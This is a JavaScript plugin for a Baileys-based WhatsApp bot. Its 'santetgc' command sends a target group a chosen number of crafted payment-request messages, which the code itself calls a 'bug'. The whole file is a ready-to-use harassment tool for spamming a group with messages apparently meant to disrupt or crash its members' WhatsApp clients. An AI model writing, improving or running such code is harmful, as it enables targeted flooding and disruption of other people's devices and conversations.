let fs = require('fs')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')

let handler = async (m, { conn, args, command, }) => {
if (!args[0]) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
let num = args[0].split('|')[0]
let jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `2023 © Dann-MD`,
}
}}), { userJid: m.chat, quoted: m })
conn.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
handler.help = ['santetgc']
handler.tags = ['owner']
handler.command = /^santet(gc|group|grup|grop)$/i

handler.owner = true 

module.exports = handler